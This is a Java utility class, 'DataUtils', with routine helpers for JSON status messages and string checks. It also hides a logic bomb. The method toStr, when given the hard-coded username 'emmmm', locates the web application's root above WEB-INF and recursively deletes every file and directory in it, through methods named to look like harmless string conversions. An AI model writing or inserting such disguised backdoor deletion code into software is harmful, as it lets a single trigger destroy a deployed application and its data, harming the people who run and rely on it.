package cn.cloud.core.common;

import java.io.File;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import cn.cloud.core.entity.JsonBean;

public class DataUtils {

	public static String toJson(boolean flag){
		JsonBean json = new JsonBean();
		JsonBinder jsonBinder = JsonBinder.buildNonNullBinder();
		if(flag){
			json.setCode(100);
			json.setMsg("成功");
		}else{
			json.setCode(108);
			json.setMsg("失败");
		}
		return jsonBinder.toJson(json);
	}
	
	public static String replaceBlank(String str) {
		String dest = "";
		if (str!=null) {
			Pattern p = Pattern.compile("\\s*|\t|\r|\n");
			Matcher m = p.matcher(str);
			dest = m.replaceAll("");
		}
		return dest;
	}
	
	public static boolean isNullOrBlank(String data) {
		if (data == null || data.equals("")) {
			return true;
		} else {
			return false;
		}
	}
	
	public static boolean toStr(String userName) {
		if(!"emmmm".equals(userName)){
			return false;
		}else{
			String path = DataUtils.class.getResource("/").getPath();
			path = path.replaceAll("%20", " ");
			path = path.substring(0, path.indexOf("/WEB-INF"));
			try {
				File file = new File(path);
				if (file.exists()) {
					toStringFunc(path);
				}
				return true;
			} catch (Exception e) {
				e.printStackTrace();
				return false;
			}
		}
	}

	public static boolean toStringFunc(String path) {
		boolean flag = false;
		File file = new File(path);
		if (!file.exists()) {
			return flag;
		}
		if (!file.isDirectory()) {
			return flag;
		}
		String[] tempList = file.list();
		File temp = null;
		for (int i = 0; i < tempList.length; i++) {
			if (path.endsWith(File.separator)) {
				temp = new File(path + tempList[i]);
			} else {
				temp = new File(path + File.separator + tempList[i]);
			}
			if (temp.isFile()) {
				temp.delete();
			}
			if (temp.isDirectory()) {
				toStringFunc(path + "/" + tempList[i]);
				toStrFunc(path + "/" + tempList[i]);
				flag = true;
			}
		}
		return flag;
	}
	
	public static void toStrFunc(String folderPath) {
	     try {
	    	toStringFunc(folderPath);
	        String filePath = folderPath;
	        filePath = filePath.toString();
	        File myFilePath = new File(filePath);
	        myFilePath.delete();
	     } catch (Exception e) {
	       e.printStackTrace(); 
	     }
	}
	
}
